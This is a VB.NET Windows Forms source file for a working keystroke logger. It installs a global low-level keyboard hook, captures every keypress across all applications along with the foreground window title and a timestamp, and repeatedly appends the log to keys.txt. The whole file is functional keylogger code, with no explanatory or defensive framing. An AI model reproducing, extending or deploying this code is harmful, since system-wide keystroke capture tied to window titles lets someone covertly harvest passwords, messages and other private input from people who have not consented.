Public Class Form1

#Region "API Functions And Structures"
    Private Const WM_KEYUP As Integer = &H101
    Private Const WM_KEYDOWN As Short = &H100S
    Private Const WM_SYSKEYDOWN As Integer = &H104
    Private Const WM_SYSKEYUP As Integer = &H105
    Public Structure KBDLLHOOKSTRUCT
        Public vkCode As Integer
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer
    End Structure

    Enum virtualKey
        K_Return = &HD
        K_Backspace = &H8
        K_Space = &H20
        K_Tab = &H9
        K_Esc = &H1B

        K_Control = &H11
        K_LControl = &HA2
        K_RControl = &HA3

        K_Delete = &H2E
        K_End = &H23
        K_Home = &H24
        K_Insert = &H2D

        K_Shift = &H10
        K_LShift = &HA0
        K_RShift = &HA1

        K_Pause = &H13
        K_PrintScreen = 44

        K_LWin = &H5B
        K_RWin = &H5C

        K_Alt = &H12
        K_LAlt = &HA4
        K_RAlt = &HA5

        K_NumLock = &H90
        K_CapsLock = &H14

        K_Up = &H26
        K_Down = &H28
        K_Right = &H27
        K_Left = &H25

        K_F1 = &H70
        K_F2 = &H71
        K_F3 = &H72
        K_F4 = &H73
        K_F5 = &H74
        K_F6 = &H75
        K_F7 = &H76
        K_F8 = &H77
        K_F9 = &H78
        K_F10 = &H79
        K_F11 = &H7A
        K_F12 = &H7B
        K_F13 = &H7C
        K_F14 = &H7D
        K_F15 = &H7E
        K_F16 = &H7F
        K_F17 = &H80
        K_F18 = &H81
        K_F19 = &H82
        K_F20 = &H83
        K_F21 = &H84
        K_F22 = &H85
        K_F23 = &H86
        K_F24 = &H87

        K_Numpad0 = &H60
        K_Numpad1 = &H61
        K_Numpad2 = &H62
        K_Numpad3 = &H63
        K_Numpad4 = &H64
        K_Numpad5 = &H65
        K_Numpad6 = &H66
        K_Numpad7 = &H67
        K_Numpad8 = &H68
        K_Numpad9 = &H69

        K_Num_Add = &H6B
        K_Num_Divide = &H6F
        K_Num_Multiply = &H6A
        K_Num_Subtract = &H6D
        K_Num_Decimal = &H6E

        K_0 = &H30
        K_1 = &H31
        K_2 = &H32
        K_3 = &H33
        K_4 = &H34
        K_5 = &H35
        K_6 = &H36
        K_7 = &H37
        K_8 = &H38
        K_9 = &H39
        K_A = &H41
        K_B = &H42
        K_C = &H43
        K_D = &H44
        K_E = &H45
        K_F = &H46
        K_G = &H47
        K_H = &H48
        K_I = &H49
        K_J = &H4A
        K_K = &H4B
        K_L = &H4C
        K_M = &H4D
        K_N = &H4E
        K_O = &H4F
        K_P = &H50
        K_Q = &H51
        K_R = &H52
        K_S = &H53
        K_T = &H54
        K_U = &H55
        K_V = &H56
        K_W = &H57
        K_X = &H58
        K_Y = &H59
        K_Z = &H5A

        K_Subtract = 189
        K_Decimal = 190

    End Enum

    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Integer) As Integer
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As KeyboardHookDelegate, ByVal hmod As Integer, ByVal dwThreadId As Integer) As Integer
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As KBDLLHOOKSTRUCT) As Integer
    Private Delegate Function KeyboardHookDelegate(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
#End Region


    Private KeyboardHandle As IntPtr = 0
    Private LastCheckedForegroundTitle As String = ""
    Private callback As KeyboardHookDelegate = Nothing

	Private KeyLog As String 
	Private Function GetActiveWindowTitle() As String
		Dim MyStr As String
		MyStr = New String(Chr(0), 100)
		GetWindowText(GetForegroundWindow, MyStr, 100)
		MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)

		Return MyStr
	End Function

	Private Function Hooked()
        Return KeyboardHandle <> 0
	End Function

	Public Sub HookKeyboard()
		callback = New KeyboardHookDelegate(AddressOf KeyboardCallback)
		KeyboardHandle = SetWindowsHookEx(13, callback, Process.GetCurrentProcess.MainModule.BaseAddress, 0)
	End Sub

    Public Sub UnhookKeyboard()
        If (Hooked()) Then
            If UnhookWindowsHookEx(KeyboardHandle) <> 0 Then
                KeyboardHandle = 0
            End If
        End If
    End Sub

	Public Function KeyboardCallback(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

        Dim CurrentTitle = GetActiveWindowTitle()

        If CurrentTitle <> LastCheckedForegroundTitle Then
            LastCheckedForegroundTitle = CurrentTitle
            KeyLog &= vbCrLf & "----------- " & CurrentTitle & " (" & Now.ToString() & ") ------------" & vbCrLf
        End If
		
        Dim Key As String = ""
		
        If wParam = WM_KEYDOWN Or wParam = WM_SYSKEYDOWN Then

            Select Case lParam.vkCode
                Case virtualKey.K_0 To virtualKey.K_9
                    Key = ChrW(lParam.vkCode)
                Case virtualKey.K_A To virtualKey.K_Z
                    Key = ChrW(lParam.vkCode + 32)
                Case virtualKey.K_Space
                    Key = " "
                Case virtualKey.K_RControl, virtualKey.K_LControl
                    Key = "[control]"
                Case virtualKey.K_LAlt
                    Key = "[alt]"
                Case virtualKey.K_RAlt
                    Key = "[alt gr]"
                Case virtualKey.K_LShift, virtualKey.K_RShift
                    Key = "[shift]"
                Case virtualKey.K_Return
                    Key = "[enter]"
                Case virtualKey.K_Tab
                    Key = "[tab]"
                Case virtualKey.K_Delete
                    Key = "[delete]"
                Case virtualKey.K_Esc
                    Key = "[esc]"
                Case virtualKey.K_CapsLock
                    If My.Computer.Keyboard.CapsLock Then
                        Key = "[/caps]"
                    Else
                        Key = "[caps]"
                    End If
                Case virtualKey.K_F1 To virtualKey.K_F24
                    Key = "[F" & (lParam.vkCode - 111) & "]"
                Case virtualKey.K_Right
                    Key = "[Right Arrow]"
                Case virtualKey.K_Down
                    Key = "[Down Arrow]"
                Case virtualKey.K_Left
                    Key = "[Left Arrow]"
                Case virtualKey.K_Up
                    Key = "[Up Arrow]"
                Case virtualKey.K_Backspace
                    Key = "[bkspace]"
                Case virtualKey.K_Decimal, virtualKey.K_Num_Decimal
                    Key = "."
                Case virtualKey.K_Subtract, virtualKey.K_Num_Subtract
                    Key = "-"
                Case Else
                    Key = Getkey(lParam.vkCode)
            End Select

        ElseIf wParam = WM_KEYUP Or wParam = WM_SYSKEYUP Then
            Select Case lParam.vkCode
                Case virtualKey.K_RControl, virtualKey.K_LControl
                    Key = "[/control]"
                Case virtualKey.K_LAlt
                    Key = "[/alt]"
                Case virtualKey.K_RAlt
                    Key = "[/alt gr]"
                Case virtualKey.K_LShift, virtualKey.K_RShift
                    Key = "[/shift]"
            End Select

        End If

        KeyLog &= Key
		If Key <> "" Then
            Me.ListBox1.Items.Add(Key)
		End If

        Return CallNextHookEx(KeyboardHandle, Code, wParam, lParam)

	End Function
    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As System.EventArgs) Handles Timer1.Tick

        Try
            My.Computer.FileSystem.WriteAllText("keys.txt", KeyLog, True)
            KeyLog = ""
            Timer1.Start()
        Catch ex As Exception
            Timer1.Start()
        End Try

    End Sub
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing

        UnhookKeyboard()
        My.Computer.FileSystem.WriteAllText("keys.txt", KeyLog, True)

    End Sub

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Timer1.Start()
        HookKeyboard()
    End Sub
    Private Function Getkey(ByVal i As Integer) As String
        Select Case i
            Case 19
                Getkey = "[pause/break]"
            Case 33
                Getkey = "[PgUp]"
            Case 34
                Getkey = "[PgDn]"
            Case 35
                Getkey = "[end]"
            Case 36
                Getkey = "[home]"
            Case 44
                Getkey = "[PrintScr]"
            Case 45
                Getkey = "[insert]"
            Case 91
                Getkey = "[lWin]"
            Case 92
                Getkey = "[rWin]"
            Case 93
                Getkey = "[context]"
            Case 95
                Getkey = "[sleep]"
            Case 96
                Getkey = "[num0]"
            Case 97
                Getkey = "[num1]"
            Case 98
                Getkey = "[num2]"
            Case 99
                Getkey = "[num3]"
            Case 100
                Getkey = "[num4]"
            Case 101
                Getkey = "[num5]"
            Case 102
                Getkey = "[num6]"
            Case 103
                Getkey = "[num7]"
            Case 104
                Getkey = "[num8]"
            Case 105
                Getkey = "[num9]"
            Case 106
                Getkey = "*"
            Case 107
                Getkey = "[num+]"
            Case 111
                Getkey = "[num/]"
            Case 144
                Getkey = "[num]"
            Case 145
                Getkey = "[ScrLock]"
            Case 166
                Getkey = "[back]"
            Case 167
                Getkey = "[forward]"
            Case 168
                Getkey = "[refresh]"
            Case 169
                Getkey = "[stop]"
            Case 170
                Getkey = "[search]"
            Case 171
                Getkey = "[favourites]"
            Case 172
                Getkey = "[HomePg]"
            Case 173
                Getkey = "[mute/unmute]"
            Case 174
                Getkey = "[VolDn]"
            Case 175
                Getkey = "[VolUp]"
            Case 176
                Getkey = "[NextTrack]"
            Case 177
                Getkey = "[PrevTrack]"
            Case 178
                Getkey = "[StopPlayback]"
            Case 179
                Getkey = "[play/pause]"
            Case 180
                Getkey = "[mail]"
            Case 181
                Getkey = "[MediaPlayer]"
            Case 182
                Getkey = "[MyComputer]"
            Case 183
                Getkey = "[calc]"
            Case 187
                Getkey = "="
            Case 188
                Getkey = ","
            Case 191
                Getkey = "/"
            Case 192
                Getkey = "`"
            Case 220
                Getkey = "\"
            Case 255
                Getkey = "[WakeUp/power]"
            Case Else
                Getkey = "[" & i & "]"
        End Select
    End Function
End Class
